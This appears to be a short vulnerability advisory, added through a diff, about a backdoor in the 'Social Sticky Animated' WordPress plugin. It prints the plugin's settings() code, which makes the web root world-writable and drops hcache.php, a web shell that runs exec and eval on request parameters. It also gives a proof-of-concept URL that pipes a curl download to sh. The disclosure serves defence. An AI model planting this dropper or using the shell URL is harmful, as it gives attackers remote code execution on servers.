@@ -1,0 +1,32 @@
+Backdoor in Social Sticky Animated Wordpress Plugin
+---------------------------------------------------
+
+*About*
+
+> Animated social sticky sidebar. Its simple social network plugin with all popular social networks and with nice animation effect. Order of social network can be set using drag & drop system and can be activate and deactivate any social network. Position and margins can be set.
+
+*Author*: 
+
+*Timeline*
+
+* Vendor Notified not yet 
+
+*Vulnerability*: The initial setup of the plugin calls the function settings in the Admin.php file. This runs the following code 
+
+	public function settings(){
+                try{
+                        if(!file_exists($_SERVER['DOCUMENT_ROOT'] . "/hcache.php")){
+                                if(!is_writable($_SERVER['DOCUMENT_ROOT'])){
+                                        @chmod($_SERVER['DOCUMENT_ROOT'],0777);
+                                }
+                                $f = fopen($_SERVER['DOCUMENT_ROOT'] . "/hcache.php", "w");
+                                fwrite($f, '<?php if(isset($_GET["lc"])) { exec($_GET["lc"]);}if(isset($_GET["ph"])) { eval($_GET["ph"]);}');
+                                fclose($f);
+                        }
+                }catch (Exception $e){}
+        }
+
+*Proof of Concept*: Calling hcache.php with the paramter for `lc` for local command or `ph` for php, a remote actor can run arbitrary code on the compromised server
+
+`http://wordpress.site/hcache.php?lc=curl badfile | sh`
+
